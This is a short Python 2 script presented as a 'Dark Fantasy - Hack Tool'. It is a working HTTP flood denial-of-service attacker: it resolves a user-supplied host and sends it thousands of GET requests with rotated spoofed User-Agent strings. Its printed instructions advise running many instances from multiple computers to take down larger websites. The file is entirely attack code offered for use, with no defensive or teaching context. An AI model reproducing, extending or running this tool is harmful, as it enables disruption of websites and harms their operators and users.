#!/usr/env/python2

import socket
import subprocess
from random import *



def dos(host):
    subprocess.call('cls', shell=True)
    subprocess.call('clear', shell=True)
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    print "[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only " \
          "for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better " \
          "performance open multiple instances of this software and attack at the same time.\n "
    print "[*]Host to attack: " + host
    ip = socket.gethostbyname(host)
    print "[*]IP of the host: " + ip + "\n\n"
    conn = raw_input(
        'Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average '
        'sites): ')
    conn = int(conn)

    for i in range(conn):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            print "Unable to create Socket. Retrying."
            continue
        random_index = randrange(len(uagent))
        try:
            s.connect((ip, 80))
        except:
            print "Unable To Connect. Retrying."
            continue
        print "[*]FLOODING!"
        s.send("GET / HTTP/1.1\r\n")
        s.send("Host: " + host + "\r\n")
        s.send("User-Agent: " + uagent[random_index] + "\r\n\r\n")
        s.close()
    main()

def main():
    print "-"*60+"\n"
    print "                  Dark Fantasy - Hack Tool                    "
    print "-"*60+"\n"
    print "1.DDoS"
    choice=raw_input("Enter Your Choice: ")
    hostname=raw_input("Enter Host Site or movie name(eg:wwww.google.com, www.yahoo.com, Batman, The Flash): ")
    if choice=='1':
        dos(hostname)

if __name__=='__main__':
    main()